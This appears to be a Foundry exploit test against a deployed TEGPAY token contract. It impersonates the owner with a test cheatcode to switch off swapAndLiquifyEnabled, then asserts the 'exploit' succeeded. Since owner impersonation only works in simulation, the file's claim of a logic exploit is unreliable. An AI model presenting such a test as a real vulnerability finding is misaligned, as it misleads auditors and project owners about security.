// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ITEGPAY {
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function swapAndLiquifyEnabled() external view returns (bool);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xc35B753d5F2e86cae7C42f755eb1812855aB10c0;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // The test file already defines TARGET and attacker
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Create interface for TEGPAY contract
        ITEGPAY targetContract = ITEGPAY(TARGET);
        address owner = 0xBd51b6D98574327734C1621A7283778c5e6Af86e;

        // Verify initial state (should be true based on constructor)
        bool initialState = targetContract.swapAndLiquifyEnabled();
        console.log("Initial swapAndLiquifyEnabled:", initialState);

        // Impersonate owner and disable swapAndLiquify
        vm.prank(owner);
        targetContract.setSwapAndLiquifyEnabled(false);

        // Verify the state change
        bool finalState = targetContract.swapAndLiquifyEnabled();
        console.log("Final swapAndLiquifyEnabled:", finalState);

        // Assert that the exploit succeeded
        assertEq(finalState, false, "swapAndLiquifyEnabled should be false after exploit");
        assertEq(targetContract.swapAndLiquifyEnabled(), false, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
